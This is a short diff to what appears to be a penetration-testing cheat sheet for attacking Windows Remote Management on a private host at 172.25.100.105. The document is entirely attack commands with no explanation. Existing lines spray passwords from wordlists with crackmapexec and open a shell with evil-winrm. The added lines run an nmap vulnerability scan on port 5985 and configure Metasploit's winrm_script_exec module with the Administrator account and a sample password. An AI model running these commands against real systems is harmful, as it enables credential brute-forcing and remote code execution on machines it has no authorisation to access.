@@ -5,4 +5,13 @@ crackmapexec winrm 172.25.100.105 -u username.txt -p password.txt
 
 evil-winrm -i 172.25.100.105 -u <username> -p <password>
 
+
 nmap -p 5985 --script vuln,vulners <target_ip>
+
+
+use exploit/windows/winrm/winrm_script_exec
+set RHOSTS 172.25.100.105
+set USERNAME Administrator
+set PASSWORD Pa$$w0rd
+set FORCE_VBS true
+run
